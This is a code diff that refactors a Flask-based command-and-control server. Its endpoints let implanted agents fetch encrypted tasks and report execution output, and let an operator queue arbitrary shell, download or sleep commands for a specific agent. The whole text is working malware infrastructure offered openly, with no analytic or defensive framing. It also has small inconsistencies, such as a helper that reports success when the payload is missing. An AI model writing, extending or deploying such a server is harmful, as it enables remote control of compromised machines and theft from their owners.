@@ -1,5 +1,7 @@
+#!/usr/bin/env python3
+"""C2 server — Flask-based command-and-control endpoints."""
+
 import sys
-import os
 import json
 from flask import Flask, request, jsonify
 from shared.protocol import decrypt_data, encrypt_data  # noqa: F401
@@ -7,100 +9,98 @@ from shared.protocol import decrypt_data, encrypt_data  # noqa: F401
 app = Flask(__name__)
 
 
-# ── In-memory task queues (per-agent) ───────────────────────────
-# tasks[agent_id] = [ {task_dict_1}, {task_dict_2}, ... ]
-_task_store = {}
+# ── In-memory task stores (per-agent) ─────────────────────────────
+# _task_queue[agent_id] = deque of task dicts
+_task_queue = {}
 
 
-# ── Route: /api/status ─────────────────────────────────────────
+def _decrypt_payload(encrypted_data: str):
+    """Safely decrypt and parse an inbound payload.
+
+    Returns (success: bool, parsed: dict, error_msg: str | None).
+    """
+    if not encrypted_data:
+        return True, {}, "missing encrypted data"
+
+    try:
+        decrypted = decrypt_data(encrypted_data)
+        parsed    = json.loads(decrypted)
+        return True, parsed, None
+    except Exception as exc:
+        print(f"[!] Decryption error: {exc}")
+        return False, {}, str(exc)
+
+
+# ── Route: /api/status (agent beacon) ────────────────────────────
 
 @app.route('/api/status', methods=['POST'])
 def status():
-    """Agent beacon endpoint.
+    """Agent check-in endpoint. Returns the next queued task (if any)."""
+    encrypted = request.json.get('data') if request.is_json else None
 
-    1. Decrypt the inbound ID from encrypted payload
-    2. Pop the next queued task (if any) for that agent
-    3. Return an encrypted JSON response with {"task": <obj|None>}
-    """
-    encrypted = request.json.get('data')
+    ok, parsed, err = _decrypt_payload(encrypted)
+    if not ok:
+        return jsonify({"error": f"decryption failed: {err}"}), 400
 
-    # Decrypt inbound payload  
-    try:
-        decrypted_json = decrypt_data(encrypted)
-        beacon_info    = json.loads(decrypted_json)
-        agent_id       = beacon_info.get('id')
-    except Exception as e:
-        print(f"[!] Beacon decryption error: {e}")
-        agent_id = None
+    agent_id      = parsed.get('id')
+    next_task     = None
 
-    # Pop next task for this agent (FIFO queue)  
-    if agent_id and agent_id in _task_store and _task_store[agent_id]:
-        task_obj       = _task_store[agent_id].pop(0)
-        response_body  = {"task": task_obj}
-    else:
-        response_body  = {"task": None}
+    # Pop the next task for this agent (FIFO)
+    if agent_id and _task_queue.get(agent_id):
+        next_task = _task_queue[agent_id].pop(0)
 
-    # Encrypt the response before sending it back  
-    encrypted_response = encrypt_data(json.dumps(response_body))          
+    response = {"task": next_task} if next_task else {"task": None}
+
+    encrypted_response = encrypt_data(json.dumps(response))
     return jsonify({"payload": encrypted_response})
 
 
-# ── Route: /api/upload ─────────────────────────────────────────
+# ── Route: /api/upload (result submission) ────────────────────────
 
 @app.route('/api/upload', methods=['POST'])
 def upload():
-    """Agent result submission endpoint.
+    """Agent posts execution results back to the server."""
+    encrypted = request.json.get('data') if request.is_json else None
 
-    1. Decrypt the inbound result payload  
-    2. Log the output along with the agent ID
-    3. Acknowledge receipt as JSON
-    """
-    encrypted = request.json.get('data')
+    ok, parsed, err = _decrypt_payload(encrypted)
+    if not ok:
+        return jsonify({"error": f"decryption failed: {err}"}), 400
 
-    try:
-        decrypted_json   = decrypt_data(encrypted)
-        info             = json.loads(decrypted_json)
-        agent_id         = info.get('id')
-        output           = info.get('output')
-        print(f"[+] Result from {agent_id}: {output}")
-    except Exception as e:
-        print(f"[!] Upload decryption error: {e}")
+    agent_id         = parsed.get('id', '<unknown>')
+    output           = parsed.get('output', '')
+    print(f"[+] Result from {agent_id}: {output}")
 
     return jsonify({"status": "received"})
 
 
-# ── Route: /api/push ───────────────────────────────────────────
+# ── Route: /api/push (operator task queue) ────────────────────────
 
 @app.route('/api/push', methods=['POST'])
 def push():
-    """Operator-facing task queue endpoint.
+    """Operator-facing endpoint to enqueue tasks for an agent."""
+    data = request.json or {}
 
-    Use this to enqueue shell/download/sleep tasks for one or more agents   
-    Accepts either a raw string command (auto-wrapped into  
-    a shell task) or a full task dict.    
-    """
-    agent_id       = request.json.get('id')
-    command        = request.json.get('command')  
+    agent_id     = data.get('id')
+    raw_command  = data.get('command')
 
-    # Auto-wrap bare string commands into a shell task  
-    if isinstance(command, dict):
-        data         = command
-    elif (command and not isinstance(command, dict)):
-        data         = {"type": "shell", "command": str(command)}
+    if not agent_id:
+        return jsonify({"error": "missing agent ID"}), 400
+
+    # Auto-wrap bare string commands into a shell task
+    if isinstance(raw_command, dict):
+        task_data = raw_command
+    elif isinstance(raw_command, str) and raw_command.strip():
+        task_data = {"type": "shell", "command": raw_command}
     else:
-        return jsonify({"status": "reject — missing command"})
+        return jsonify({"error": "missing command"}), 400
 
-    # Enqueue the task for this agent's next beacon round    
-    if agent_id not in _task_store:
-        _task_store[agent_id]  = []
-        
-    _task_store[agent_id].append(data)  
+    _task_queue.setdefault(agent_id, []).append(task_data)
 
     return jsonify({"status": "task queued"})
 
 
-# ── Entry point ────────────────────────────────────────────────
+# ── Entry point ───────────────────────────────────────────────────
 
 if __name__ == "__main__":
-    print("[*] C2 server running on 0.0.0.0:5000")  
+    print("[*] C2 server running on 0.0.0.0:5000")
     app.run(host="0.0.0.0", port=5000)
